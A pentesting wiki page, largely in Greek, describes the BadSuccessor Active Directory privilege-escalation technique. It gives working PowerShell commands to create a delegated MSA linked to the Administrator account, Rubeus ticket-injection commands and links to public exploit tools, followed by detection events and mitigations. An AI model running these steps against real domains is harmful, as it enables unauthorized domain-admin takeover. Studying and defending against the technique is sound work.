# BadSuccessor: Privilege Escalation via Delegated MSA Migration Abuse

{{#include ../../banners/hacktricks-training.md}}

## Overview

Delegated Managed Service Accounts (**dMSA**) είναι ο επόμενης γενιάς διάδοχος των **gMSA** που περιλαμβάνονται στα Windows Server 2025. Μια νόμιμη ροή εργασίας μετανάστευσης επιτρέπει στους διαχειριστές να αντικαταστήσουν έναν *παλιό* λογαριασμό (χρήστη, υπολογιστή ή λογαριασμό υπηρεσίας) με ένα dMSA διατηρώντας διαφανώς τις άδειες. Η ροή εργασίας εκτίθεται μέσω των PowerShell cmdlets όπως `Start-ADServiceAccountMigration` και `Complete-ADServiceAccountMigration` και βασίζεται σε δύο LDAP χαρακτηριστικά του **dMSA object**:

* **`msDS-ManagedAccountPrecededByLink`** – *DN link* στον υπερκείμενο (παλιό) λογαριασμό.
* **`msDS-DelegatedMSAState`**       – κατάσταση μετανάστευσης (`0` = καμία, `1` = σε εξέλιξη, `2` = *ολοκληρωμένη*).

Εάν ένας επιτιθέμενος μπορεί να δημιουργήσει **οποιοδήποτε** dMSA μέσα σε ένα OU και να χειριστεί άμεσα αυτά τα 2 χαρακτηριστικά, οι LSASS & KDC θα θεωρήσουν το dMSA ως *διάδοχο* του συνδεδεμένου λογαριασμού. Όταν ο επιτιθέμενος στη συνέχεια αυθεντικοποιείται ως dMSA **κληρονομεί όλα τα δικαιώματα του συνδεδεμένου λογαριασμού** – έως **Domain Admin** αν ο λογαριασμός Διαχειριστή είναι συνδεδεμένος.

Αυτή η τεχνική ονομάστηκε **BadSuccessor** από την Unit 42 το 2025. Στη στιγμή της συγγραφής **δεν είναι διαθέσιμο** κανένα security patch; μόνο η σκληροποίηση των αδειών OU μετριάζει το ζήτημα.

### Attack prerequisites

1. Ένας λογαριασμός που είναι *επιτρεπτός* να δημιουργεί αντικείμενα μέσα σε **μια Οργανωτική Μονάδα (OU)** *και* έχει τουλάχιστον ένα από:
* `Create Child` → **`msDS-DelegatedManagedServiceAccount`** object class
* `Create Child` → **`All Objects`** (γενική δημιουργία)
2. Δικτύωση με LDAP & Kerberos (τυπικό σενάριο συνδεδεμένου τομέα / απομακρυσμένη επίθεση).

## Enumerating Vulnerable OUs

Η Unit 42 δημοσίευσε ένα PowerShell helper script που αναλύει τους περιγραφείς ασφαλείας κάθε OU και επισημαίνει τις απαιτούμενες ACEs:
```powershell
Get-BadSuccessorOUPermissions.ps1 -Domain contoso.local
```
Κάτω από την επιφάνεια, το σενάριο εκτελεί μια σελιδοποιημένη αναζήτηση LDAP για `(objectClass=organizationalUnit)` και ελέγχει κάθε `nTSecurityDescriptor` για

* `ADS_RIGHT_DS_CREATE_CHILD` (0x0001)
* `Active Directory Schema ID: 31ed51fa-77b1-4175-884a-5c6f3f6f34e8` (object class *msDS-DelegatedManagedServiceAccount*)

## Βήματα Εκμετάλλευσης

Μόλις εντοπιστεί ένα εγ writable OU, η επίθεση είναι μόνο 3 εγγραφές LDAP μακριά:
```powershell
# 1. Create a new delegated MSA inside the delegated OU
New-ADServiceAccount -Name attacker_dMSA \
-DNSHostName host.contoso.local \
-Path "OU=DelegatedOU,DC=contoso,DC=com"

# 2. Point the dMSA to the target account (e.g. Domain Admin)
Set-ADServiceAccount attacker_dMSA -Add \
@{msDS-ManagedAccountPrecededByLink="CN=Administrator,CN=Users,DC=contoso,DC=com"}

# 3. Mark the migration as *completed*
Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2}
```
Μετά την αναπαραγωγή, ο επιτιθέμενος μπορεί απλά να **logon** ως `attacker_dMSA$` ή να ζητήσει ένα Kerberos TGT – τα Windows θα δημιουργήσουν το token του *superseded* λογαριασμού.

### Αυτοματοποίηση

Πολλές δημόσιες PoCs περιλαμβάνουν ολόκληρη τη ροή εργασίας, συμπεριλαμβανομένης της ανάκτησης κωδικού πρόσβασης και της διαχείρισης εισιτηρίων:

* SharpSuccessor (C#) – [https://github.com/logangoins/SharpSuccessor](https://github.com/logangoins/SharpSuccessor)
* BadSuccessor.ps1 (PowerShell) – [https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)
* NetExec module – `badsuccessor` (Python) – [https://github.com/Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec)

### Μετά την εκμετάλλευση
```powershell
# Request a TGT for the dMSA and inject it (Rubeus)
Rubeus asktgt /user:attacker_dMSA$ /password:<ClearTextPwd> /domain:contoso.local
Rubeus ptt /ticket:<Base64TGT>

# Access Domain Admin resources
dir \\DC01\C$
```
## Detection & Hunting

Ενεργοποιήστε την **Επιθεώρηση Αντικειμένων** σε OUs και παρακολουθήστε τα εξής Windows Security Events:

* **5137** – Δημιουργία του **dMSA** αντικειμένου
* **5136** – Τροποποίηση του **`msDS-ManagedAccountPrecededByLink`**
* **4662** – Συγκεκριμένες αλλαγές χαρακτηριστικών
* GUID `2f5c138a-bd38-4016-88b4-0ec87cbb4919` → `msDS-DelegatedMSAState`
* GUID `a0945b2b-57a2-43bd-b327-4d112a4e8bd1` → `msDS-ManagedAccountPrecededByLink`
* **2946** – Έκδοση TGT για το dMSA

Η συσχέτιση `4662` (τροποποίηση χαρακτηριστικού), `4741` (δημιουργία υπολογιστή/λογαριασμού υπηρεσίας) και `4624` (επόμενη σύνδεση) επισημαίνει γρήγορα τη δραστηριότητα BadSuccessor. Οι λύσεις XDR όπως το **XSIAM** περιλαμβάνουν έτοιμες προς χρήση ερωτήσεις (βλ. αναφορές).

## Mitigation

* Εφαρμόστε την αρχή της **ελάχιστης προνομίας** – αναθέστε τη διαχείριση *Λογαριασμού Υπηρεσίας* μόνο σε αξιόπιστους ρόλους.
* Αφαιρέστε το `Create Child` / `msDS-DelegatedManagedServiceAccount` από OUs που δεν το απαιτούν ρητά.
* Παρακολουθήστε τα IDs γεγονότων που αναφέρονται παραπάνω και ειδοποιήστε για *μη-Tier-0* ταυτότητες που δημιουργούν ή επεξεργάζονται dMSAs.

## See also

{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

## References

- [Unit42 – When Good Accounts Go Bad: Exploiting Delegated Managed Service Accounts](https://unit42.paloaltonetworks.com/badsuccessor-attack-vector/)
- [SharpSuccessor PoC](https://github.com/logangoins/SharpSuccessor)
- [BadSuccessor.ps1 – Pentest-Tools-Collection](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)
- [NetExec BadSuccessor module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/badsuccessor.py)

{{#include ../../banners/hacktricks-training.md}}
